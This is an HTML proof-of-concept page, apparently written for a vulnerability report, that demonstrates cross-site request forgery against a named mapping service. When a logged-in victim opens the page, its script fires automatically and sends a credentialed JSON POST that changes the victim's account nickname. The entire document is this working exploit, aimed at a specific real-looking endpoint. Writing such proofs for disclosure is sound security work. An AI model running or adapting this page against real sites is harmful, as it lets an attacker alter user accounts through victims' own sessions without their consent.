<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF JSON POC</title>
</head>
<body>
    <h1>CSRF JSON POC</h1>
    <p>If the victim is logged in and visits this page, their nickname will be changed.</p>
    <script>
        // Craft the JSON payload
        const data = {
            "showAvatar": false,
            "type": "NICK",
            "nickname": "csrf"
        };

        // Create and send the malicious POST request
        fetch("https://service.mapcreator.here.com/service-mapcreator/usersettings/nickname", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            body: JSON.stringify(data),
            credentials: "include" // Include cookies to simulate victim's session
        });
    </script>
</body>
</html>
